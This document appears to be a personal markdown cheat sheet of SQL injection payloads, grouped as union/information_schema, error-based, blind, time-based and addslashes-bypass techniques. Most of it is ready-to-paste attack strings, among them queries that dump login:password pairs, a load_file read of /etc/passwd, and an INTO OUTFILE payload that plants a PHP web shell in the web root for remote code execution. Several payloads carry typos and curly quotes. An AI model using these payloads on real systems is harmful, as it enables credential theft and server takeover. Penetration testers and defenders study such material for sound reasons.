# SQL Injection
SQL Injection is a common security vulnerability in web applications that interact with databases. In this type of attack, an attacker intentionally inserts malicious SQL statements into a web form's input fields or URL parameters, exploiting flaws in data validation or sanitization. When these instructions are executed by the database, they can allow the attacker to manipulate system behavior, such as accessing, modifying, or deleting data, or even gain complete control over the server.

## Information Schema
Through the Information Schema, it is possible to obtain the table with system users and passwords and obtain the information contained in it.

Exemple: ' union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema = "string" %23

Exemple: ' union select 1,2,concat(login,':',senha),4,5 from table %23

## Error Based
Error Based, as the name implies, is based on the error that returns when trying to make a query in the database in some field. With it, you can inject SQL code to discover information about the table and the database.

Exemple: ' union select 1,2,3... %23'

Exemple: ' order by 1 or 2 or 3...'

Exemple: union select 1, column_name, load_file(”/etc/passwd”), 4, from information_schema.columns where table_schema=”database” and table_name=”users” %23

## Blind
When there are no indications if there is a SQL Injection, some tests can be used to verify the AND and OR logic of the program.

Exemple: ' or 1=1 union select 1,2#

### Blind Post
To discover confidential information from the server through logic, it is possible to use the ascii function to find out the name of the database in which the application is located, so it is very common to use Burp Suite in Repeater mode to make requests.

Exemple: ' or length(database()) = 7 #

Exemple: ' or ascii(substring(database(),1,1)) = ascii number for letter # 

Exemple: ' or database() = char(115,116,114,105,110,103) # 

Exemple: ' or ascii(substring(select loing from column name limit 0,1),1,1)) = ascii number for letter #

## Time Based
Time Based uses the sleep() function to check if there is a SQL Injection vulnerability by observing if the page takes a long time to respond after sending a sleep() in a request to the database. If possible, you can use if to scan information about the database, tables, and other information as in other vulnerabilities

Exemple: ' or sleep(5)#

Exemple: ' or if (length(database()) = 5, sleep(5), 0)#

Exemple: ' or if (database() = char(char(115,116,114,105,110,103)), sleep(5), 0)#

Exemple: ' or if (ascii(substring(database(), 1, 1)) = 100, sleep(5), 0)#

## SQLi to RCE
With SQL command injection, you can write data to the server with the INTO OUTFILE command and the path of the directory you want to save.

Exemple: ‘ union all select 1,2,3,4, “string” INTO OUTFILE “/var/www/html/website/file.txt” %23

Exemple: ‘ union all select 1,2,3,4, “<?php system($_GET[’parameter’]); ?>” INTO OUTFILE “/var/www/html/website/banners/file.php” %23

## Bypass addslashes
In some cases, because of the way it was programmed to be queried in the database, some backslashes will be added to the query, making it impossible to make queries with single quotes, generating an error. However, one of the ways to circumvent this mechanism is to pass string values in decimals separated by commas with the char() function.

Exemple: echo -n “string” | od -An -tdC

Exemple:-1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=char(115,116,114,105,110,103)

Site: [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)